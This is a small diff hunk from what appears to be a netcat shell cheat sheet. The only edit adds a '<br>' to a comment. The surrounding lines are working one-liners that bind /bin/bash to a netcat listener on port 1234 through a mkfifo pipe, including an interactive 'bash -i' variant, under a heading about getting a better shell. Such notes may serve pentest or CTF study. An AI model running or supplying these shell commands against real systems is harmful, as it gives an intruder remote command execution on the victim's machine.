@@ -23,7 +23,7 @@ nc 10.10.0.1 1234
 # Additional Methods
 mkfifo /tmp/f ; nc -lk 1234 0< /tmp/f | /bin/bash 1> /tmp/f
 
-#to show output on remote host
+#to show output on remote host<br>
 mkfifo /tmp/f ; nc -l 1234 < /tmp/f | /bin/bash -i 2>&1 | tee /tmp/f
 
 # Getting a better Shell
